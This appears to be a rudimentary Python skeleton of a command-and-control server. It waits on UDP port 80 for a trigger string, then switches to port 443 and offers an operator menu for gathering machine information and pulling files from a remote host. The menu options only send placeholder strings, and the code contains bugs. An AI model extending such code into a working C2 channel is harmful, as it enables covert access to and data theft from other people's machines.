from socket import *

serverSocket = socket(AF_INET, SOCK_DGRAM)
serverSocket.bind(('',80))
print ("The server is ready to recieve")

while True:
    message, clientAddress = serverSocket.recvfrom(2048)
    modifiedMessage = message.decode()

    if modifiedMessage == "aabbcc":
        serverSocket = socket(AF_INET, SOCK_DGRAM)
        serverSocket.bind (('',443))
        choice = 0
        while choice != 3:
            print ("Here is the C2 menu")
            print ("Enter a 1 to get machine info")
            print ("Enter a 2 to get upload a file from the machine to here")
            print ("Enter a 3 to close the connection")
            choice = int(input ("Please choose an option: ")) #getting user choice
            if choice == 1:
                message = "Option 1 was chosen"
                serverSocket.sendto(message.encode(),clientAddress)
            if choice == 2:
                message = "Option 2 was chosen"
                serverSocket.sendto(message.encode(),clientAddress)
            if choice == 3:
                message = "Option 3 was chosen"
                serverSocket.sendto(message.encode(),clientAddress)
                serverSocket.close
                
            message, clientAddress = serverSocket.recvfrom(2048)
            print (message.decode())
